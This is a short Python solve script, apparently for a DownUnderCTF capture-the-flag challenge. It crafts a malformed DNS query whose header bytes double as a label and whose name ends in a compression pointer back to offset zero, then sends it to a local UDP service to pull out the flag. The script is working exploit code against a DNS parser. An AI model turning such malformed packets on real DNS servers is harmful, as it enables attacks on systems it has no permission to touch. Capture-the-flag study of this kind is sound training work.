from pwn import *
from dnslib import DNSRecord

# https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.1 (header format)
# https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.4 (message compression)
payload = flat([
    b'\x03c', # ID
    b'o', # QR, Opcode, AA, TC, RD
    b'm', # RA, Z, RCODE
    b'\x00\x01', # QDCOUNT
    b'\x00\x00', # ANCOUNT
    b'\x00\x00', # NSCOUNT
    b'\x00\x00', # ARCOUNT
    b'\x04free\x04flag\x03for\x04flag\x06loving\x04flag\x09capturers\x0cdownunderctf\xc0\x00', # QNAME
    b'\x00\x10', # QTYPE
    b'\x00\x00' # QCLASS
])
print('payload length:', len(payload))

conn = remote('0.0.0.0', 8053, typ='udp')
conn.send(payload)
ans = conn.recv()
print(DNSRecord.parse(ans))
